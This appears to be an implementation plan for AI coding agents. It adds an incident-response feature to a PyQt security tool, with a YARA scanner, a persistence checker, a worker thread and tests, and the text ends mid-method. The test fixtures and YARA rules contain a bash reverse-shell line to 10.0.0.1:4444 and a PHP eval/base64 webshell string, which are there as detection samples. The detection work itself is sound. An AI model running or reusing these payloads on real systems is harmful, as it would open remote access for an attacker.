# Phase 5 — Incident Response Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a dedicated Incident Response page with a unified three-stage scan: log file analysis (existing rules engine), YARA file scanning, and persistence mechanism checking — all wired to a new `IncidentPage` UI with a `BreachTimeline` chronological event widget.

**Architecture:** `IncidentWorker` (QThread) runs Stage 1 (log analysis, logic copied from `LogAnalyzerWorker`), Stage 2 (YARA scan via `yara_scanner.run()`), and Stage 3 (persistence check via `persistence_checker.run()`). Each stage is isolated — failures skip to the next. Findings write to SQLite before signal emission. On `scan_complete`, `IncidentPage` reads `incident_events` rows from the DB and populates `BreachTimeline`. `log_analyzer.py` and `scan_view.py` are **not modified**.

**Tech Stack:** PyQt6, yara-python, Python stdlib (subprocess, glob, os, pathlib), pytest-qt, SQLite

---

## File map

| Action | Path |
|--------|------|
| Modify | `db.py` |
| Create | `workers/tools/yara_scanner.py` |
| Create | `workers/tools/persistence_checker.py` |
| Create | `workers/incident_worker.py` |
| Create | `screens/widgets/breach_timeline.py` |
| Create | `screens/incident_page.py` |
| Modify | `sidebar.py` |
| Modify | `main_window.py` |
| Create | `tests/test_incident_worker.py` |
| Create | `tests/test_breach_timeline.py` |

---

### Task 1: DB — add `incident_events` table and methods

**Files:**
- Modify: `db.py`

- [ ] **Step 1.1: Add `incident_events` to `_SCHEMA`**

In `db.py`, find `_SCHEMA = """` and append the new table definition before the closing `"""`. Add it after the `app_settings` table block:

```python
CREATE TABLE IF NOT EXISTS incident_events (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    scan_id     INTEGER,
    timestamp   TEXT,
    event_type  TEXT,
    source_host TEXT,
    dest_host   TEXT,
    description TEXT,
    evidence    TEXT
);
```

- [ ] **Step 1.2: Add `insert_incident_event` method to `DB` class**

Add after `insert_finding`:

```python
    def insert_incident_event(self, event: dict) -> int:
        with self._lock:
            cur = self._conn.execute(
                "INSERT INTO incident_events "
                "(scan_id, timestamp, event_type, source_host, dest_host, description, evidence) "
                "VALUES (?,?,?,?,?,?,?)",
                (
                    event.get("scan_id"),
                    event.get("timestamp", ""),
                    event.get("event_type", "anomaly"),
                    event.get("source_host", ""),
                    event.get("dest_host", ""),
                    event.get("description", ""),
                    event.get("evidence", ""),
                ),
            )
            self._conn.commit()
            return cur.lastrowid
```

- [ ] **Step 1.3: Add `get_incident_events` method to `DB` class**

Add after `insert_incident_event`:

```python
    def get_incident_events(self, scan_id: int) -> list[dict]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT id, scan_id, timestamp, event_type, source_host, dest_host, description, evidence "
                "FROM incident_events WHERE scan_id=? ORDER BY id",
                (scan_id,),
            ).fetchall()
        return [
            {
                "id": r[0], "scan_id": r[1], "timestamp": r[2],
                "event_type": r[3], "source_host": r[4],
                "dest_host": r[5], "description": r[6], "evidence": r[7],
            }
            for r in rows
        ]
```

- [ ] **Step 1.4: Verify schema is applied on fresh DB**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate
python -c "
from db import DB
db = DB(':memory:')
eid = db.insert_incident_event({'scan_id': 1, 'timestamp': '2026-06-11T00:00:00Z', 'event_type': 'entry', 'source_host': '1.2.3.4', 'dest_host': 'server', 'description': 'test', 'evidence': 'line 42'})
events = db.get_incident_events(1)
print(events)
assert len(events) == 1
assert events[0]['event_type'] == 'entry'
print('OK')
"
```

Expected: `OK`

- [ ] **Step 1.5: Run existing tests to confirm no regressions**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen pytest tests/ -q 2>&1 | tail -5
```

Expected: `283 passed`

- [ ] **Step 1.6: Commit**

```bash
git add db.py
git commit -m "feat: add incident_events table and insert/get methods to DB"
```

---

### Task 2: YARA scanner tool (TDD)

**Files:**
- Create: `workers/tools/yara_scanner.py`
- Create: `tests/test_yara_scanner.py`

- [ ] **Step 2.1: Write failing tests**

Create `tests/test_yara_scanner.py`:

```python
import sys
import types
import tempfile
import os
import pytest
from unittest.mock import MagicMock, patch


def test_returns_empty_list_when_yara_not_installed():
    """If yara-python is not installed, run() returns [] without raising."""
    with patch.dict(sys.modules, {"yara": None}):
        # Force re-import with yara absent
        if "workers.tools.yara_scanner" in sys.modules:
            del sys.modules["workers.tools.yara_scanner"]
        from workers.tools import yara_scanner
        result = yara_scanner.run()
    assert result == []


def test_returns_empty_list_when_no_matches(tmp_path):
    """Files that don't match any rule produce no findings."""
    clean_file = tmp_path / "clean.txt"
    clean_file.write_text("hello world")

    mock_yara = MagicMock()
    mock_rules = MagicMock()
    mock_rules.match.return_value = []
    mock_yara.compile.return_value = mock_rules

    with patch.dict(sys.modules, {"yara": mock_yara}):
        if "workers.tools.yara_scanner" in sys.modules:
            del sys.modules["workers.tools.yara_scanner"]
        from workers.tools import yara_scanner
        # Override FIXED_PATHS so it only scans tmp_path
        orig = yara_scanner.FIXED_PATHS
        yara_scanner.FIXED_PATHS = [str(tmp_path)]
        result = yara_scanner.run()
        yara_scanner.FIXED_PATHS = orig

    assert result == []


def test_returns_finding_on_yara_match(tmp_path):
    """A YARA match on a file produces one finding dict."""
    infected_file = tmp_path / "shell.php"
    infected_file.write_text("<?php eval(base64_decode('xxx')); ?>")

    mock_match = MagicMock()
    mock_match.rule = "Webshell_PHP_Eval"
    mock_match.namespace = "default"

    mock_rules = MagicMock()
    mock_rules.match.return_value = [mock_match]

    mock_yara = MagicMock()
    mock_yara.compile.return_value = mock_rules

    with patch.dict(sys.modules, {"yara": mock_yara}):
        if "workers.tools.yara_scanner" in sys.modules:
            del sys.modules["workers.tools.yara_scanner"]
        from workers.tools import yara_scanner
        orig = yara_scanner.FIXED_PATHS
        yara_scanner.FIXED_PATHS = [str(tmp_path)]
        result = yara_scanner.run()
        yara_scanner.FIXED_PATHS = orig

    assert len(result) == 1
    assert result[0]["rule"] == "Webshell_PHP_Eval"
    assert result[0]["severity"] == "high"
    assert str(infected_file) == result[0]["file"]


def test_extra_path_is_scanned(tmp_path):
    """extra_path files are included in the scan."""
    extra_dir = tmp_path / "extra"
    extra_dir.mkdir()
    target = extra_dir / "suspicious.sh"
    target.write_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")

    mock_match = MagicMock()
    mock_match.rule = "Reverse_Shell_Bash"
    mock_rules = MagicMock()
    # Only match in the extra path
    def _match(filepath):
        if str(extra_dir) in filepath:
            return [mock_match]
        return []
    mock_rules.match.side_effect = _match
    mock_yara = MagicMock()
    mock_yara.compile.return_value = mock_rules

    with patch.dict(sys.modules, {"yara": mock_yara}):
        if "workers.tools.yara_scanner" in sys.modules:
            del sys.modules["workers.tools.yara_scanner"]
        from workers.tools import yara_scanner
        orig = yara_scanner.FIXED_PATHS
        yara_scanner.FIXED_PATHS = []  # no fixed paths
        result = yara_scanner.run(extra_path=str(extra_dir))
        yara_scanner.FIXED_PATHS = orig

    assert len(result) == 1
    assert result[0]["rule"] == "Reverse_Shell_Bash"


def test_compile_error_returns_empty_list():
    """YARA compile error → [] with no exception raised."""
    mock_yara = MagicMock()
    mock_yara.compile.side_effect = Exception("SyntaxError in rules")
    mock_yara.SyntaxError = Exception

    with patch.dict(sys.modules, {"yara": mock_yara}):
        if "workers.tools.yara_scanner" in sys.modules:
            del sys.modules["workers.tools.yara_scanner"]
        from workers.tools import yara_scanner
        result = yara_scanner.run()

    assert result == []
```

- [ ] **Step 2.2: Run tests — verify they fail**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen pytest tests/test_yara_scanner.py -v 2>&1 | head -20
```

Expected: `ModuleNotFoundError` — `workers/tools/yara_scanner.py` does not exist.

- [ ] **Step 2.3: Create `workers/tools/yara_scanner.py`**

```python
import os

FIXED_PATHS = ["/tmp", "/var/tmp", "/dev/shm", "/run"]

BUILTIN_RULES = r"""
rule Webshell_PHP_Eval {
    strings:
        $a = /eval\s*\(\s*base64_decode/ nocase
    condition:
        $a
}
rule Reverse_Shell_Bash {
    strings:
        $a = "bash -i >& /dev/tcp/" nocase
    condition:
        $a
}
rule Meterpreter_Artifact {
    strings:
        $a = "meterpreter" nocase
        $b = "ReflectiveDll" nocase
    condition:
        any of them
}
"""


def run(extra_path: str = "") -> list[dict]:
    """Scan FIXED_PATHS + extra_path with built-in YARA rules.

    Returns list of dicts: {file, rule, severity, description}.
    Returns [] if yara-python is not installed or rules fail to compile.
    """
    try:
        import yara
    except ImportError:
        return []

    try:
        rules = yara.compile(source=BUILTIN_RULES)
    except Exception:
        return []

    paths_to_scan: list[str] = []
    for p in FIXED_PATHS:
        if os.path.isdir(p):
            paths_to_scan.append(p)
    if extra_path and os.path.exists(extra_path):
        paths_to_scan.append(extra_path)

    results: list[dict] = []
    for base in paths_to_scan:
        if os.path.isfile(base):
            _scan_file(base, rules, results)
        else:
            for root, _, files in os.walk(base):
                for fname in files:
                    _scan_file(os.path.join(root, fname), rules, results)
    return results


def _scan_file(filepath: str, rules, results: list[dict]) -> None:
    try:
        matches = rules.match(filepath=filepath)
        for m in matches:
            results.append({
                "file": filepath,
                "rule": m.rule,
                "severity": "high",
                "description": f"YARA rule '{m.rule}' matched in {filepath}",
            })
    except Exception:
        pass
```

- [ ] **Step 2.4: Run tests — verify they pass**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen pytest tests/test_yara_scanner.py -v
```

Expected: all 5 tests PASS.

- [ ] **Step 2.5: Commit**

```bash
git add workers/tools/yara_scanner.py tests/test_yara_scanner.py
git commit -m "feat: add YARA scanner tool with built-in webshell and reverse shell rules"
```

---

### Task 3: Persistence checker tool (TDD)

**Files:**
- Create: `workers/tools/persistence_checker.py`
- Create: `tests/test_persistence_checker.py`

- [ ] **Step 3.1: Write failing tests**

Create `tests/test_persistence_checker.py`:

```python
import os
import time
import tempfile
import pytest
from unittest.mock import patch, MagicMock


def test_cron_recent_mtime_emits_finding(tmp_path):
    """A cron file modified within the last 7 days triggers a finding."""
    cron_file = tmp_path / "suspicious_job"
    cron_file.write_text("*/5 * * * * /tmp/backdoor.sh\n")
    # Set mtime to 1 hour ago (within 7-day window)
    recent = time.time() - 3600
    os.utime(str(cron_file), (recent, recent))

    from workers.tools.persistence_checker import _check_cron
    results = _check_cron(cron_dirs=[str(tmp_path)])
    assert len(results) == 1
    assert results[0]["check"] == "cron"
    assert results[0]["severity"] == "high"


def test_cron_old_mtime_no_finding(tmp_path):
    """A cron file last modified 30 days ago is not flagged."""
    cron_file = tmp_path / "old_job"
    cron_file.write_text("0 2 * * * /usr/bin/backup.sh\n")
    old = time.time() - (30 * 86400)
    os.utime(str(cron_file), (old, old))

    from workers.tools.persistence_checker import _check_cron
    results = _check_cron(cron_dirs=[str(tmp_path)])
    assert results == []


def test_authorized_keys_two_keys_emits_finding(tmp_path):
    """authorized_keys with 2 or more keys triggers a finding."""
    ssh_dir = tmp_path / ".ssh"
    ssh_dir.mkdir()
    auth_keys = ssh_dir / "authorized_keys"
    auth_keys.write_text(
        "ssh-rsa AAAA...key1== user1@host\n"
        "ssh-rsa BBBB...key2== attacker@evil\n"
    )

    from workers.tools.persistence_checker import _check_authorized_keys
    results = _check_authorized_keys(home_dirs=[str(tmp_path)])
    assert len(results) == 1
    assert results[0]["check"] == "authorized_keys"
    assert results[0]["severity"] == "medium"


def test_authorized_keys_one_key_no_finding(tmp_path):
    """authorized_keys with exactly 1 key is not flagged."""
    ssh_dir = tmp_path / ".ssh"
    ssh_dir.mkdir()
    (ssh_dir / "authorized_keys").write_text("ssh-rsa AAAA...key1== admin@corp\n")

    from workers.tools.persistence_checker import _check_authorized_keys
    results = _check_authorized_keys(home_dirs=[str(tmp_path)])
    assert results == []


def test_suid_unknown_binary_emits_finding():
    """A SUID binary not in the known-good set triggers a finding."""
    mock_proc = MagicMock()
    mock_proc.returncode = 0
    mock_proc.stdout = "/usr/bin/sudo\n/tmp/evil_suid\n"

    with patch("subprocess.run", return_value=mock_proc):
        from workers.tools import persistence_checker
        # Reload to ensure fresh import
        import importlib
        importlib.reload(persistence_checker)
        results = persistence_checker._check_suid()

    assert len(results) == 1
    assert results[0]["check"] == "suid"
    assert "/tmp/evil_suid" in results[0]["path"]
    assert results[0]["severity"] == "high"


def test_suid_only_known_good_no_finding():
    """Only known-good SUID binaries → no findings."""
    mock_proc = MagicMock()
    mock_proc.returncode = 0
    mock_proc.stdout = "/usr/bin/sudo\n/usr/bin/passwd\n"

    with patch("subprocess.run", return_value=mock_proc):
        from workers.tools import persistence_checker
        import importlib
        importlib.reload(persistence_checker)
        results = persistence_checker._check_suid()

    assert results == []


def test_run_returns_combined_results(tmp_path):
    """run() aggregates results from all three sub-checks."""
    from workers.tools.persistence_checker import run

    with patch("workers.tools.persistence_checker._check_cron", return_value=[{"check": "cron", "path": "x", "detail": "y", "severity": "high"}]), \
         patch("workers.tools.persistence_checker._check_authorized_keys", return_value=[]), \
         patch("workers.tools.persistence_checker._check_suid", return_value=[{"check": "suid", "path": "/tmp/evil", "detail": "not in baseline", "severity": "high"}]):
        results = run()

    assert len(results) == 2
    checks = {r["check"] for r in results}
    assert checks == {"cron", "suid"}
```

- [ ] **Step 3.2: Run tests — verify they fail**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && pytest tests/test_persistence_checker.py -v 2>&1 | head -20
```

Expected: `ModuleNotFoundError` — `workers/tools/persistence_checker.py` does not exist.

- [ ] **Step 3.3: Create `workers/tools/persistence_checker.py`**

```python
import glob
import os
import subprocess
import time
from pathlib import Path

_CRON_DIRS = [
    "/etc/cron.d",
    "/etc/cron.daily",
    "/etc/cron.hourly",
    "/etc/cron.weekly",
    "/etc/cron.monthly",
    "/var/spool/cron/crontabs",
]

_CRON_FILES = ["/etc/crontab"]

_MAX_AGE_SECONDS = 7 * 86400

KNOWN_GOOD_SUID = {
    "/usr/bin/sudo",
    "/usr/bin/passwd",
    "/usr/bin/newgrp",
    "/usr/bin/gpasswd",
    "/usr/bin/chsh",
    "/usr/bin/chfn",
    "/usr/bin/su",
    "/usr/bin/mount",
    "/usr/bin/umount",
    "/usr/bin/pkexec",
    "/usr/lib/openssh/ssh-keysign",
    "/usr/lib/dbus-1.0/dbus-daemon-launch-helper",
}


def run() -> list[dict]:
    """Run all three persistence sub-checks. Returns list of finding dicts."""
    results: list[dict] = []
    results.extend(_check_cron())
    results.extend(_check_authorized_keys())
    results.extend(_check_suid())
    return results


def _check_cron(cron_dirs: list[str] | None = None) -> list[dict]:
    now = time.time()
    cutoff = now - _MAX_AGE_SECONDS
    dirs = cron_dirs if cron_dirs is not None else _CRON_DIRS
    findings: list[dict] = []

    candidates: list[str] = list(_CRON_FILES) if cron_dirs is None else []
    for d in dirs:
        if os.path.isdir(d):
            for entry in os.listdir(d):
                candidates.append(os.path.join(d, entry))

    for path in candidates:
        if not os.path.isfile(path):
            continue
        try:
            mtime = os.path.getmtime(path)
        except OSError:
            continue
        if mtime >= cutoff:
            findings.append({
                "check": "cron",
                "path": path,
                "detail": f"Modified {int((now - mtime) / 3600)}h ago",
                "severity": "high",
            })
    return findings


def _check_authorized_keys(home_dirs: list[str] | None = None) -> list[dict]:
    findings: list[dict] = []
    if home_dirs is None:
        search_roots = list(Path("/home").glob("*")) + [Path("/root")]
    else:
        search_roots = [Path(d) for d in home_dirs]

    for home in search_roots:
        ak_path = home / ".ssh" / "authorized_keys"
        if not ak_path.is_file():
            continue
        try:
            text = ak_path.read_text(errors="replace")
        except OSError:
            continue
        keys = [
            ln for ln in text.splitlines()
            if ln.strip() and not ln.strip().startswith("#")
        ]
        if len(keys) >= 2:
            findings.append({
                "check": "authorized_keys",
                "path": str(ak_path),
                "detail": f"{len(keys)} keys present (threshold: 1)",
                "severity": "medium",
            })
    return findings


def _check_suid() -> list[dict]:
    findings: list[dict] = []
    try:
        proc = subprocess.run(
            ["find", "/usr", "/bin", "/sbin", "/usr/local",
             "-perm", "-4000", "-type", "f"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        for line in proc.stdout.splitlines():
            path = line.strip()
            if path and path not in KNOWN_GOOD_SUID:
                findings.append({
                    "check": "suid",
                    "path": path,
                    "detail": "SUID binary not in known-good baseline",
                    "severity": "high",
                })
    except Exception:
        pass
    return findings
```

- [ ] **Step 3.4: Run tests — verify they pass**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && pytest tests/test_persistence_checker.py -v
```

Expected: all 7 tests PASS.

- [ ] **Step 3.5: Commit**

```bash
git add workers/tools/persistence_checker.py tests/test_persistence_checker.py
git commit -m "feat: add persistence checker tool (cron, authorized_keys, SUID)"
```

---

### Task 4: IncidentWorker (TDD)

**Files:**
- Create: `workers/incident_worker.py`
- Create: `tests/test_incident_worker.py`

Context: `IncidentWorker` runs three stages. Stage 1 reuses the exact logic from `LogAnalyzerWorker` (copy of `_read_file`, `_run_rules`, `_enrich_with_ai`, `_parse_ai_response`). Stage 2 calls `yara_scanner.run()`. Stage 3 calls `persistence_checker.run()`. Each finding is written to DB then emitted. Findings from Stages 1 and 3 also write a row to `incident_events`.

The rule-to-event-type mapping:
```python
_RULE_EVENT_TYPE = {
    "ssh_brute_force":     "entry",
    "root_sudo":           "lateral",
    "user_account_change": "persistence",
    "pubkey_login":        "entry",
    "sqli_attempt":        "entry",
    "scanner_ua":          "entry",
    "http_scan_rate":      "entry",
    "port_scan":           "entry",
    "repeated_block":      "entry",
    "oom_killer":          "anomaly",
    "kernel_panic":        "anomaly",
}
```

- [ ] **Step 4.1: Write failing tests**

Create `tests/test_incident_worker.py`:

```python
import textwrap
import threading
import tempfile
import os
from datetime import datetime, timezone
from unittest.mock import MagicMock, patch
import pytest

from workers.incident_worker import IncidentWorker
from db import DB
from models import Scan


def _make_worker(log_path: str = "", yara_extra_path: str = "") -> tuple[IncidentWorker, DB]:
    db = DB(":memory:")
    scan_id = db.insert_scan(Scan(
        id=None, client_id=None, target="incident",
        status="running",
        started_at=datetime.now(timezone.utc).isoformat(),
        finished_at=None,
    ))
    w = IncidentWorker(
        log_path=log_path,
        scan_id=scan_id,
        db=db,
        yara_extra_path=yara_extra_path,
    )
    return w, db


# ── Stage 1 tests ────────────────────────────────────────────────────────────

def test_stage1_file_not_found_emits_scan_failed(qtbot, tmp_path):
    w, _ = _make_worker(log_path=str(tmp_path / "missing.log"))
    failed = []
    w.scan_failed.connect(failed.append)
    mock_runner = MagicMock()
    result = w._stage1_log_analysis(mock_runner)
    assert result is None
    assert len(failed) == 1


def test_stage1_ssh_brute_force_emits_finding(qtbot, tmp_path):
    log = tmp_path / "auth.log"
    # Write 6 SSH failure lines (threshold is 5)
    lines = "\n".join(
        [f"Jun 11 00:0{i}:00 server sshd[123]: Failed password for root from 10.0.0.1 port 222{i} ssh2"
         for i in range(6)]
    )
    log.write_text(lines)

    w, db = _make_worker(log_path=str(log))
    findings = []
    w.finding_found.connect(findings.append)
    mock_runner = MagicMock()
    result = w._stage1_log_analysis(mock_runner)

    assert result is not None
    assert len(findings) >= 1
    assert any("ssh" in f.title.lower() or "brute" in f.title.lower() for f in findings)


def test_stage1_finding_written_to_db(qtbot, tmp_path):
    log = tmp_path / "auth.log"
    lines = "\n".join(
        [f"Jun 11 00:0{i}:00 server sshd[1]: Failed password for root from 10.0.0.1 port 222{i} ssh2"
         for i in range(6)]
    )
    log.write_text(lines)

    w, db = _make_worker(log_path=str(log))
    mock_runner = MagicMock()
    w._stage1_log_analysis(mock_runner)

    stored = db.query_findings_by_scan(w._scan_id)
    assert len(stored) >= 1
    assert all(f.tool == "log-analyzer" for f in stored)


# ── Stage 2 tests ────────────────────────────────────────────────────────────

def test_stage2_yara_match_emits_finding(qtbot, tmp_path):
    w, db = _make_worker()
    findings = []
    w.finding_found.connect(findings.append)

    mock_match = [{"file": "/tmp/shell.php", "rule": "Webshell_PHP_Eval", "severity": "high", "description": "YARA match"}]
    with patch("workers.tools.yara_scanner.run", return_value=mock_match):
        count = w._stage2_yara_scan()

    assert count == 1
    assert len(findings) == 1
    assert findings[0].tool == "yara"


def test_stage2_yara_match_written_to_db(qtbot, tmp_path):
    w, db = _make_worker()
    mock_match = [{"file": "/tmp/shell.php", "rule": "Webshell_PHP_Eval", "severity": "high", "description": "YARA match"}]
    with patch("workers.tools.yara_scanner.run", return_value=mock_match):
        w._stage2_yara_scan()

    stored = db.query_findings_by_scan(w._scan_id)
    assert any(f.tool == "yara" for f in stored)


def test_stage2_yara_error_returns_zero(qtbot):
    w, _ = _make_worker()
    with patch("workers.tools.yara_scanner.run", side_effect=Exception("yara error")):
        count = w._stage2_yara_scan()
    assert count == 0


# ── Stage 3 tests ────────────────────────────────────────────────────────────

def test_stage3_persistence_finding_emitted(qtbot):
    w, db = _make_worker()
    findings = []
    w.finding_found.connect(findings.append)

    mock_results = [{"check": "suid", "path": "/tmp/evil", "detail": "not in baseline", "severity": "high"}]
    with patch("workers.tools.persistence_checker.run", return_value=mock_results):
        count = w._stage3_persistence()

    assert count == 1
    assert len(findings) == 1
    assert findings[0].tool == "persistence"


def test_stage3_persistence_written_to_db(qtbot):
    w, db = _make_worker()
    mock_results = [{"check": "cron", "path": "/etc/cron.d/evil", "detail": "recent", "severity": "high"}]
    with patch("workers.tools.persistence_checker.run", return_value=mock_results):
        w._stage3_persistence()

    stored = db.query_findings_by_scan(w._scan_id)
    assert any(f.tool == "persistence" for f in stored)


def test_stage3_persistence_event_written_to_db(qtbot):
    w, db = _make_worker()
    mock_results = [{"check": "suid", "path": "/tmp/evil", "detail": "bad", "severity": "high"}]
    with patch("workers.tools.persistence_checker.run", return_value=mock_results):
        w._stage3_persistence()

    events = db.get_incident_events(w._scan_id)
    assert len(events) == 1
    assert events[0]["event_type"] == "persistence"


def test_stage3_error_returns_zero(qtbot):
    w, _ = _make_worker()
    with patch("workers.tools.persistence_checker.run", side_effect=Exception("perm denied")):
        count = w._stage3_persistence()
    assert count == 0


# ── Cancel test ──────────────────────────────────────────────────────────────

def test_cancel_sets_db_status_cancelled(qtbot, tmp_path):
    log = tmp_path / "auth.log"
    log.write_text("no matches here\n")
    w, db = _make_worker(log_path=str(log))
    w.stop()  # cancel before run

    with qtbot.waitSignal(w.scan_complete, timeout=3000, raising=False):
        w.start()
        w.wait(2000)

    # After cancellation the scan status should not be "running"
    row = db._conn.execute("SELECT status FROM scans WHERE id=?", (w._scan_id,)).fetchone()
    assert row[0] in ("cancelled", "complete", "failed")
```

- [ ] **Step 4.2: Run tests — verify they fail**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen pytest tests/test_incident_worker.py -v 2>&1 | head -20
```

Expected: `ModuleNotFoundError` — `workers/incident_worker.py` does not exist.

- [ ] **Step 4.3: Create `workers/incident_worker.py`**

```python
import re
import threading
from collections import defaultdict
from datetime import datetime, timezone

from PyQt6.QtCore import QThread, pyqtSignal

from db import DB
from models import Finding
from workers.log_rules import detect_format, RULES
from workers.base_tool import CancelledError

try:
    from advisor.gemini_client import GeminiClient as _GeminiClient
except Exception:
    _GeminiClient = None

_RULE_EVENT_TYPE: dict[str, str] = {
    "ssh_brute_force":     "entry",
    "root_sudo":           "lateral",
    "user_account_change": "persistence",
    "pubkey_login":        "entry",
    "sqli_attempt":        "entry",
    "scanner_ua":          "entry",
    "http_scan_rate":      "entry",
    "port_scan":           "entry",
    "repeated_block":      "entry",
    "oom_killer":          "anomaly",
    "kernel_panic":        "anomaly",
}


class IncidentWorker(QThread):
    finding_found  = pyqtSignal(object)
    tool_progress  = pyqtSignal(str, int, str)
    log_line       = pyqtSignal(str)
    scan_complete  = pyqtSignal(int, int)
    scan_failed    = pyqtSignal(str)
    error_occurred = pyqtSignal(str, str)

    def __init__(
        self,
        log_path: str,
        scan_id: int,
        db: DB,
        yara_extra_path: str = "",
        parent=None,
    ):
        super().__init__(parent)
        self._log_path = log_path
        self._scan_id = scan_id
        self._db = db
        self._yara_extra_path = yara_extra_path
        self._cancel_event = threading.Event()

    def stop(self) -> None:
        self._cancel_event.set()

    def run(self) -> None:
        total = 0
        try:
            # Stage 1
            if self._cancel_event.is_set():
                self._db.update_scan_status(self._scan_id, "cancelled", datetime.now(timezone.utc).isoformat())
                return
            result1 = self._stage1_log_analysis(None)
            if result1 is None:
                self._db.update_scan_status(self._scan_id, "failed", datetime.now(timezone.utc).isoformat())
                return
            total += result1

            # Stage 2
            if self._cancel_event.is_set():
                self._db.update_scan_status(self._scan_id, "cancelled", datetime.now(timezone.utc).isoformat())
                return
            total += self._stage2_yara_scan()

            # Stage 3
            if self._cancel_event.is_set():
                self._db.update_scan_status(self._scan_id, "cancelled", datetime.now(timezone.utc).isoformat())
                return
            total += self._stage3_persistence()

        except Exception as exc:
            self._db.update_scan_status(self._scan_id, "failed", datetime.now(timezone.utc).isoformat())
            self.scan_failed.emit(f"Incident scan error: {exc}")
            return

        self._db.update_scan_status(self._scan_id, "complete", datetime.now(timezone.utc).isoformat())
        self.scan_complete.emit(0, total)

    # ── Stage 1: Log Analysis ────────────────────────────────────────────────

    def _stage1_log_analysis(self, _runner) -> int | None:
        self.log_line.emit("[incident] Stage 1 — log analysis")
        try:
            lines = self._read_file()
        except FileNotFoundError:
            self.scan_failed.emit(f"Log file not found: {self._log_path}")
            return None
        except PermissionError:
            self.scan_failed.emit("Cannot read log file: permission denied")
            return None

        fmt = detect_format(lines)
        self.log_line.emit(f"[incident] detected format: {fmt}")

        findings = self._run_rules(lines, fmt)
        self.log_line.emit(f"[incident] rules complete — {len(findings)} findings")

        findings = self._enrich_with_ai(findings)

        for f in findings:
            f.id = self._db.insert_finding(f)
            self._maybe_write_event(f)
            self.finding_found.emit(f)

        self.log_line.emit(f"[incident] Stage 1 complete — {len(findings)} findings")
        return len(findings)

    def _read_file(self) -> list[str]:
        with open(self._log_path, "r", errors="replace") as fh:
            return fh.readlines()

    def _run_rules(self, lines: list[str], fmt: str) -> list[Finding]:
        applicable = [
            r for r in RULES
            if "*" in r.formats or fmt in r.formats or fmt == "unknown"
        ]

        count_rules = {"ssh_brute_force", "http_scan_rate", "repeated_block", "port_scan"}
        count_hits: dict[str, dict[str, list[int]]] = defaultdict(lambda: defaultdict(list))
        match_hits: dict[str, set[str]] = defaultdict(set)

        for lineno, line in enumerate(lines, start=1):
            for rule in applicable:
                m = rule.pattern.search(line)
                if not m:
                    continue
                if rule.name in count_rules:
                    key = m.group(1) if m.lastindex and m.lastindex >= 1 else "unknown"
                    count_hits[rule.name][key].append(lineno)
                else:
                    match_hits[rule.name].add(m.group(0)[:120])

        findings: list[Finding] = []
        thresholds = {
            "ssh_brute_force": 5,
            "http_scan_rate":  20,
            "repeated_block":  10,
            "port_scan":       1,
        }
        rule_by_name = {r.name: r for r in applicable}

        for rule_name, key_hits in count_hits.items():
            rule = rule_by_name.get(rule_name)
            if not rule:
                continue
            threshold = thresholds.get(rule_name, 1)
            for key, line_numbers in key_hits.items():
                if len(line_numbers) < threshold:
                    continue
                desc = (
                    f"{rule.description}: {len(line_numbers)} occurrences from {key} "
                    f"(lines {line_numbers[0]}–{line_numbers[-1]})"
                )
                findings.append(Finding(
                    id=None, scan_id=self._scan_id, host_id=None,
                    tool="log-analyzer", severity=rule.severity.lower(),
                    title=f"{rule_name.replace('_', ' ').title()} — {key}",
                    description=desc, raw_json="",
                    created_at=datetime.now(timezone.utc).isoformat(),
                ))

        for rule_name, matched_strings in match_hits.items():
            rule = rule_by_name.get(rule_name)
            if not rule:
                continue
            for matched in matched_strings:
                findings.append(Finding(
                    id=None, scan_id=self._scan_id, host_id=None,
                    tool="log-analyzer", severity=rule.severity.lower(),
                    title=rule_name.replace("_", " ").title(),
                    description=f"{rule.description}: {matched}", raw_json="",
                    created_at=datetime.now(timezone.utc).isoformat(),
                ))

        return findings

    def _enrich_with_ai(self, findings: list[Finding]) -> list[Finding]:
        if not self._db:
            return findings
        enabled = self._db.get_setting("ai_advisor_enabled") == "1"
        api_key = self._db.get_setting("gemini_api_key") or ""
        if not enabled or not api_key or _GeminiClient is None:
            return findings
        self.log_line.emit("[incident] enriching with AI Advisor...")
        try:
            summary_lines = [
                f"- [{f.severity.upper()}] {f.title}: {f.description[:200]}"
                for f in findings
            ]
            prompt = (
                "You are a security analyst. Analyse these log anomalies and identify "
                "any additional security concerns. For each concern respond with:\n"
                "SEVERITY: HIGH|MEDIUM|LOW\nTITLE: short title\nDESCRIPTION: one sentence\n\n"
                + "\n".join(summary_lines[:20])
            )
            response = _GeminiClient(api_key).generate(prompt)
            ai_findings = self._parse_ai_response(response)
            findings.extend(ai_findings)
            self.log_line.emit(f"[incident] AI Advisor added {len(ai_findings)} findings")
        except Exception as exc:
            self.log_line.emit(f"[incident] AI Advisor error (skipped): {exc}")
        return findings

    def _parse_ai_response(self, text: str) -> list[Finding]:
        findings = []
        blocks = re.split(r"\n(?=SEVERITY:)", text.strip())
        for block in blocks:
            sev_m = re.search(r"SEVERITY:\s*(HIGH|MEDIUM|LOW|CRITICAL|INFO)", block, re.IGNORECASE)
            title_m = re.search(r"TITLE:\s*(.+)", block)
            desc_m = re.search(r"DESCRIPTION:\s*(.+)", block)
            if not (sev_m and title_m):
                continue
            findings.append(Finding(
                id=None, scan_id=self._scan_id, host_id=None,
                tool="log-analyzer", severity=sev_m.group(1).lower(),
                title=title_m.group(1).strip(),
                description=desc_m.group(1).strip() if desc_m else "",
                raw_json="",
                created_at=datetime.now(timezone.utc).isoformat(),
            ))
        return findings

    def _maybe_write_event(self, finding: Finding) -> None:
        rule_name = finding.title.split(" — ")[0].lower().replace(" ", "_")
